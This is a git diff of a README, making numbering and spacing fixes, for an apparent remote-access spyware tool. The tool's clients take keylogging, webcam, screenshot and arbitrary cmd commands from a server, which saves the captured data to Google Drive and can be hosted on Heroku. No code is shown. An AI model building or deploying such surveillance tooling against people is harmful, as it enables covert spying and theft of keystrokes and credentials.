@@ -8,11 +8,11 @@ Possible commands are:
 1. `start_keylogging` - starts to log keyboard and saves it to a file locally.
 2. `send_keylogging` - sends the logged data to the server which saves it to Google Drive.
 3. `stop_keylogging` - stops to log keyboard.
-4. `take_webcam_capture` - if webcam is present and not in use, takes picture from webcam and sends it to the server which 5. saves it to Google Drive. Otherwise, does nothing.
-6. `take_screenshot` - takes screenshot and sends it to the server which saves it to Google Drive.
-7. `execute <command>` - executes `<command>` in cmd.
-8. `stop_execution` - stops the program execution.
-9. `no_commands` - does nothing (used in case the server wants to tell a client that it has no commands for the moment).
+4. `take_webcam_capture` - if webcam is present and not in use, takes picture from webcam and sends it to the server which saves it to Google Drive. Otherwise, does nothing.
+5. `take_screenshot` - takes screenshot and sends it to the server which saves it to Google Drive.
+6. `execute <command>` - executes `<command>` in cmd.
+7. `stop_execution` - stops the program execution.
+8. `no_commands` - does nothing (used in case the server wants to tell a client that it has no commands for the moment).
 
 For the data received from clients to be saved in Google Drive, one would have to enable the Drive API and fill in the credentials in file credentials.json (`Enable the Drive API` button in: https://developers.google.com/drive/api/v3/quickstart/python#step_1_turn_on_the , choose project name, desktop app, download credentials).
 One might choose to erase file credentials.json, and then a link would be opened in one's browser in which one would need to sign into their gmail account.
@@ -20,6 +20,6 @@ In both cases, one would have to fill in the client_id and client_secret in file
 
 Commands can be added to a client by surfing to / (on server), in which a form will be presented containing all mac-addresses (clients are identified by their mac-address) and a box with space to enter one or more on the commands mentioned above.
 
-Users are encouraged to upload the server to a hosting website (such as heroku). All the file required by heroku are already supplied in this repository(such as requirements.txt, Procfile and runtime.txt).
+Users are encouraged to upload the server to a hosting website (such as heroku). All the file required by heroku are already supplied in this repository (such as requirements.txt, Procfile and runtime.txt).
 
 Please be responsible with using this code. Tomer Gibor is not liable by any means to any damaged caused by anyone who used this code.
